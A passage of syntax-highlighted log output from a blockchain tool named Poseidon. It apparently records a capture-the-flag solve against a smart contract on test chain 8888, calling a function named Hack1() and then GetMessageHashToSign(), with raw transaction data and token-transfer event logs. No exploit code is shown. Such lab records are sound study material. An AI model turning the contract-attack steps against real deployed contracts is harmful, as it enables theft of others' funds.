class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xfF25FACBE77eac4eD3603188CccB9431f1A26448&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000ff25facbe77eac4ed3603188cccb9431f1a26448&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xfF25FACBE77eac4eD3603188CccB9431f1A26448&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xfF25FACBE77eac4eD3603188CccB9431f1A26448&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>5</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xfF25FACBE77eac4eD3603188CccB9431f1A26448&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000002&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>6</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xfF25FACBE77eac4eD3603188CccB9431f1A26448&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000003&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>7</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xfF25FACBE77eac4eD3603188CccB9431f1A26448&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000002f7ccf235768b35e0ba171d7fa60690ef35e79ba&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106737</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x7cd2dd1c1a87fbd424d766f6994e2124aaccbff3be82de6cbe9013a55c03e3f6&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x67a42027cdaf49dab8367765e3db2e1e2f781914d8bcef4fdaba78bea69a1aa8&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>})]</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>25.542</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>CallFunction</span><span class=p>:</span><span class=mi>501</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>CallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>Hack1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>25.790</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>328</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0xf035f31e7653c4acaa7c13c4b038fe0e391f1d5e1616fbbdde480538ee69966d</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Txn</span><span class=p>]{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;chainId&#34;</span><span class=p>:</span> <span class=mi>8888</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;to&#34;</span><span class=p>:</span> <span class=s2>&#34;0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;nonce&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=s2>&#34;1.2 Gwei&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;gas&#34;</span><span class=p>:</span> <span class=mi>234482</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0xbb3ee56d&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>31.468</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>SendTransaction</span><span class=p>:</span><span class=mi>336</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Account</span><span class=p>][</span><span class=n>SendTransaction</span><span class=p>][</span><span class=n>Traditional</span><span class=p>][</span><span class=n>Success</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>TransactionHash</span><span class=p>]</span><span class=mh>0xf035f31e7653c4acaa7c13c4b038fe0e391f1d5e1616fbbdde480538ee69966d</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>BlockNumber</span><span class=p>]</span><span class=mi>106739</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>From</span><span class=p>]</span><span class=mh>0x2f7CcF235768B35e0ba171d7Fa60690EF35e79ba</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>To</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Value</span><span class=p>]</span><span class=mi>0</span> <span class=p>[</span><span class=n>GasUsed</span><span class=p>]</span><span class=mi>174112</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Data</span><span class=p>]</span><span class=mh>0xbb3ee56d</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Logs</span><span class=p>][</span><span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000005&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106739</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xf035f31e7653c4acaa7c13c4b038fe0e391f1d5e1616fbbdde480538ee69966d&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x1fde857c5ee5bfd97212f72c6c56768137bb7c4cf9781d0c0b62345ac54d0d37&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0x4C9229666BcBb8FEB354acBaf77cD408e4eD5D50&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106739</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xf035f31e7653c4acaa7c13c4b038fe0e391f1d5e1616fbbdde480538ee69966d&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x1fde857c5ee5bfd97212f72c6c56768137bb7c4cf9781d0c0b62345ac54d0d37&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106739</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xf035f31e7653c4acaa7c13c4b038fe0e391f1d5e1616fbbdde480538ee69966d&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x1fde857c5ee5bfd97212f72c6c56768137bb7c4cf9781d0c0b62345ac54d0d37&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xC1401CC3Fa69c089c7F756C8E31627364e5dfAb6&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x5a55b2d970d079d39ce4c5dc9ec6de52ebfc2bbcfc7466d62eea534ee8736673&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000f8d8fe5bfd88174b29869563aa53d7698a7a36d5&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106739</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xf035f31e7653c4acaa7c13c4b038fe0e391f1d5e1616fbbdde480538ee69966d&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x1fde857c5ee5bfd97212f72c6c56768137bb7c4cf9781d0c0b62345ac54d0d37&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>}),</span> <span class=n>AttributeDict</span><span class=p>({</span><span class=s1>&#39;address&#39;</span><span class=p>:</span> <span class=s1>&#39;0xf8D8fe5bfd88174b29869563aA53d7698A7A36d5&#39;</span><span class=p>,</span> <span class=s1>&#39;topics&#39;</span><span class=p>:</span> <span class=p>[</span><span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000fae1d8a8942d8ba4f26a4ee1732ef094b66b97eb&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x000000000000000000000000c1401cc3fa69c089c7f756c8e31627364e5dfab6&#39;</span><span class=p>),</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;</span><span class=p>)],</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=s1>&#39;0x&#39;</span><span class=p>,</span> <span class=s1>&#39;blockNumber&#39;</span><span class=p>:</span> <span class=mi>106739</span><span class=p>,</span> <span class=s1>&#39;transactionHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0xf035f31e7653c4acaa7c13c4b038fe0e391f1d5e1616fbbdde480538ee69966d&#39;</span><span class=p>),</span> <span class=s1>&#39;transactionIndex&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;blockHash&#39;</span><span class=p>:</span> <span class=n>HexBytes</span><span class=p>(</span><span class=s1>&#39;0x1fde857c5ee5bfd97212f72c6c56768137bb7c4cf9781d0c0b62345ac54d0d37&#39;</span><span class=p>),</span> <span class=s1>&#39;logIndex&#39;</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=s1>&#39;removed&#39;</span><span class=p>:</span> <span class=n>False</span><span class=p>})]</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>31.598</span> <span class=o>|</span> <span class=n>SUCCESS</span>  <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>ReadOnlyCallFunction</span><span class=p>:</span><span class=mi>535</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>ReadOnlyCallFunction</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>ContractAddress</span><span class=p>]</span><span class=mh>0xfAe1d8a8942d8ba4F26a4EE1732EF094b66B97Eb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Function</span><span class=p>]</span><span class=n>GetMessageHashToSign</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Result</span><span class=p>]</span><span class=sa>b</span><span class=s1>&#39;&amp;ZW</span><span class=se>\x90\xee\x8c\t</span><span class=s1>t-</span><span class=se>\xf5\xc3</span><span class=s1>4,</span><span class=se>\x13</span><span class=s1>.</span><span class=se>\xd4</span><span class=s1>`</span><span class=se>\xc8</span><span class=s1>J</span><span class=se>\xf3\xc0</span><span class=s1>.</span><span class=se>\xaa\xc8</span><span class=s1>*</span><span class=se>\xf0\x9f</span><span class=s1>_</span><span class=se>\xb8</span><span class=s1>_f</span><span class=se>\xa3</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=mi>2022</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>06</span> <span class=mi>10</span><span class=p>:</span><span class=mi>45</span><span class=p>:</span><span class=mf>31.825</span> <span class=o>|</span> <span class=n>INFO</span>     <span class=o>|</span> <span class=n>Poseidon</span><span class=o>.</span><span class=n>Blockchain</span><span class=p>:</span><span class=n>CallFunction</span><span class=p>:</span><span class=mi>501</span> <span class=o>-</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Contract</span><span class=p>][</span><span class=n>CallFunction</span><span class=p>]</span>
